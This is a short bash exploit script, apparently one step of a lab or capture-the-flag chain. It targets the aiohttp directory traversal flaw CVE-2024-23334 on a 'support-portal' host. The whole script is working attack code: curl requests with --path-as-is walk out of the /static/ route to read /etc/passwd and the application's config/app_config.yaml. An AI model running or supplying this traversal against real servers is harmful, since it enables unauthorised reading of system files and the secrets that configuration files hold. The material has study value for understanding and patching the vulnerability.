#!/usr/bin/env bash
# Step 3+4: Directory traversal via aiohttp CVE-2024-23334
# Reads /opt/support-portal/config/app_config.yaml through /static/ route.
# Usage: TARGET=<host:port> ./02-traversal-config.sh
TARGET="${TARGET:-localhost:8080}"

echo "=== [Step 3] Test directory traversal ==="
# CVE-2024-23334: follow_symlinks=True skips boundary check in aiohttp < 3.9.2
# curl normalizes ../ by default; use --path-as-is to send literal path
curl -sv --path-as-is "http://${TARGET}/static/x/../../etc/passwd" 2>&1 | tail -20

echo ""
echo "=== [Step 4] Read app_config.yaml ==="
curl -s --path-as-is "http://${TARGET}/static/x/../../config/app_config.yaml"
